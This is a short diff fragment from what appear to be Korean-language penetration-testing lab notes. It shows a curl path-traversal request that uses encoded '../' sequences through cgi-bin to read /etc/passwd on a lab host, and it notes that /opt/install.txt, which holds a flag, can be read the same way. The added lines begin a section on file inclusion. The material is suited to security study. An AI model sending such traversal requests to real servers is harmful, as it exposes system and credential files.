@@ -42,4 +42,5 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 	6. 아주 잘된다.
 	7. 위와 같은 방법으로  **/opt/install.txt** 도 탐색이 가능하고, 그안에 플래그가 있다.
 
-
+## 9.2. File Inclusion Vulnerabilities
+1. 파일 포함 및 디렉토리 
